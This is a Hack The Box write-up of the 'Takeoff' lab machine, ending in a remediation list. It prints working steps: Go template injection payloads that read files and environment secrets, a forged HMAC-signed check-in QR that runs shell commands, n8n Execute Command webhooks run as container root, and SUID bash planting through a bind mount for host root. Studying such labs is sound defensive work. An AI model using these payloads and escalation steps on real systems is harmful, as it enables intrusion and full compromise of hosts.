---
title: "HTB Takeoff: Go SSTI, a forged QR, and root through n8n's bind mount"
summary: "A booking box: a Go template leaks the key that signs check-in QR codes, a forged check-in runs a command as www-data, and an n8n API key ends in a container root that shares the host's home directory."
seoTitle: "HTB Takeoff: SSTI, forged QR and root via n8n"
description: "HTB Takeoff writeup: a Go SSTI leaks the QR HMAC key, a forged check-in gives RCE as www-data, and an n8n API key leads to container root then host root."
date: 2026-11-03
lang: en
target: "HTB Takeoff (10.129.250.248)"
cve: ""
severity: "Critical"
tags: ["ssti", "go", "rce", "n8n", "privilege-escalation", "docker"]
pair: "htb-takeoff"
draft: false
---

Takeoff is a Hack The Box Linux box: one web application, "HTB Airways Booking", written in Go with Echo. No other host in scope, no writeup consulted: the whole chain was found and proven against the target itself. This writeup follows it in the order it happened, from reading a file to `euid=0` on the host.

The terminal outputs were arranged into readable panels from the session logs; the screenshots are real captures. Passwords, hashes and flags are redacted or edited.

## The scope

```bash
nmap -Pn -sT -p- --min-rate 400 -T4 --open 10.129.250.248
```

Only two ports open: `22` (OpenSSH 10.0p2, Debian 13) and `80` (nginx in front of the Go app). No extra vhosts, no exposed admin routes. The session uses an HS256 JWT (`session_token`), strictly validated: neither `alg: none` nor a tampered token gets through.

![nmap: only 22 and 80 open on the target](/img/takeoff-01-nmap.webp)

## SSTI in a ticket's notes field

The app lets you annotate a ticket (`POST /tickets/{PNR}/notes`) and then preview or download it (`GET /tickets/{PNR}/preview`, `/download`). The preview renders the `notes` field with Go's `text/template`, the plain-text template package, not `html/template`, which at least would have escaped the HTML.

```
POST /tickets/XFQXYS/notes
notes=SSTI proof: 7*7 = {{ printf "%d" 49 }}
      --- /etc/passwd ---
      {{ .File "/etc/passwd" }}

GET /tickets/XFQXYS/preview
→ "SSTI proof: 7*7 = 49 ... root:x:0:0:root:/root:/bin/bash daemon:x:1:1 ..."
```

One detail stood out: purely arithmetic expressions like `{{7*7}}` don't evaluate, they come back literal. What works is any function or method call on the context object, and the context has a `.File` method that reads whatever file the application process can read.

![SSTI reading /proc/self/environ through the ticket preview](/img/takeoff-02-ssti.webp)

Pointing `.File` at `htb-air.service`'s `/proc/self/environ` returned the process's full environment, with two variables that decided the rest of the chain:

- `TICKET_VALIDATION_TOKEN`: the HMAC-SHA256 key that signs check-in QR codes.
- `N8N_API_KEY`: an API key for the internal n8n instance.

I validated the first one right away: computed the HMAC of a real QR with the leaked key and it matched the QR's own signature byte for byte.

## RCE as www-data via a forged QR

The check-in flow (`POST /api/check-in`) decodes a Go `gob` blob, `VerifyTicketAuthenticity{PNR, Name, NotifyCmd, ...}`, verifies the HMAC signature, then runs the `NotifyCmd` field through a shell. With the leaked key in hand, forging a valid QR with an arbitrary command is just arithmetic:

```
forged QR: VerifyTicketAuthenticity{ PNR: "XFQXYS", ..., NotifyCmd:
  "id>/tmp/p;whoami>>/tmp/p;hostname>>/tmp/p" }
signature = HMAC-SHA256(TICKET_VALIDATION_TOKEN, gob_prefix)   # 32 bytes

POST /api/check-in  (base64 blob)
→ 302 Location: /check-in?msg=B+One+checked+in+successfully
```

With no direct output channel, I read the result by reusing the same SSTI: wrote the output to `/tmp/p` and pointed `.File` there.

```
GET /tickets/XFQXYS/preview  (notes = {{ .File "/tmp/p" }})
→ uid=33(www-data) gid=33(www-data) groups=33(www-data)
  www-data
  takeoff.htb
```

![RCE confirmed: id returns www-data](/img/takeoff-03-rce.webp)

`www-data` had no sudo, no exploitable SUID binaries, no interesting cron job, and `/home/kpark/user.txt` refused to be read directly, local enumeration needed another target. The `htb-air.service` process pointed to an n8n instance listening only on loopback, port `5678`.

## n8n: owner key, Execute Command, container root

The `N8N_API_KEY` leaked in step one was a **global owner** key: the instance had user management disabled, so that single key carried unrestricted access to workflows, credentials and executions.

```
POST http://127.0.0.1:5678/webhook/q   {"cmd":"id;hostname;grep CapEff /proc/self/status"}
→ {"exitCode":0,"stdout":"uid=0(root) gid=0(root) groups=0(root)\ntakeoff...\nCapEff:\t00000000a80425fb"}
```

![n8n API key authenticated, command running as root inside the container](/img/takeoff-04-n8n.webp)

I created and activated a workflow with an **Execute Command** node behind a webhook; any request to it runs as `root` inside the n8n container. The first thing I checked was what that root could touch outside the container itself: `/root` turned out to be a read-write bind mount of the host's `/home/kpark`:

```
mountinfo: 8:4 /home/kpark /root rw,relatime - ext4 /dev/sda4 rw
```

That handed over three things at once: the `user.txt` (value omitted), n8n's credential-encryption key, and a place to plant an `authorized_keys` that turns into SSH as `kpark` on the host. I tested the container's capabilities before going further: no `CAP_SYS_ADMIN`, no `docker.sock`, and the device cgroup blocked reading `/dev/sda4` directly. The container alone couldn't read `root.txt`; that needed one more step on the host.

## Root on the host: a SUID bit planted by whoever controls the bind mount

The same partition the container had mounted as `/root` is, on the host, `/home` on `/dev/sda4`, mounted **without `nosuid`**. That turns any write from the container's root into that directory into a SUID opportunity:

```
# as kpark, on the host:
cp /usr/bin/bash /home/kpark/.x && chmod 755 /home/kpark/.x

# from inside the container, via the same Execute Command webhook:
chown root:root /root/.x && chmod 4755 /root/.x
→ -rwsr-xr-x 1 root root 1298416 /root/.x

# back as kpark, over SSH with the planted key:
/home/kpark/.x -p -c "id; cat /root/root.txt"
→ uid=1001(kpark) gid=1001(kpark) euid=0(root)
→ [flag omitted]
```

![euid=0 through the planted SUID bash, root.txt read](/img/takeoff-05-root.webp)

A copied `bash` ends up SUID root on the host because two mistakes meet: the partition holding `kpark`'s home doesn't block `setuid` on binaries, and the automation container has write access right there.

The SUID binary created for the test (`/home/kpark/.x`) was removed at the end of the engagement; no original file on the machine was changed.

## What closed and what I'd take forward

A minor finding fell by the wayside: `POST /api/check-in` accepts a check-in QR without requiring a session and without checking who owns the ticket. Since the HMAC signature still blocks forgery without the key, the impact is anonymous replay with PII exposure (passenger name, PNR, seat, email), not execution, but it's the same endpoint that, with the key leaked, became the RCE point.

The lesson I'm taking from this one is about where a secret can live: `TICKET_VALIDATION_TOKEN` and `N8N_API_KEY` had no business sitting in the environment of a process that also has a reachable SSTI: a scoped secret manager would have killed the whole chain at step one. And the bind mount part is a reminder that "root inside the container" is only a real boundary once what the container can write to on the host is also treated as attack surface. `/home` without `nosuid`, plus a directory mounted as the `/root` of an automation service, is root on the host waiting to happen.

**Remediation, in order of impact:**

1. Never render user input with `text/template`; for untrusted data, `html/template` alone still isn't enough; treat notes as plain text.
2. Keep secrets out of the web process's environment; `TICKET_VALIDATION_TOKEN` should already be rotated.
3. Check-in: require authentication and ticket ownership, nonce/expiry on the QR, and never derive shell commands from a payload that's only verified by HMAC.
4. n8n: owner-scoped API keys shouldn't live in third-party services; disable or restrict *Execute Command*; run the container without root.
5. Never bind-mount a host directory as a container's `/root`; mount `/home` with `nosuid,nodev`.
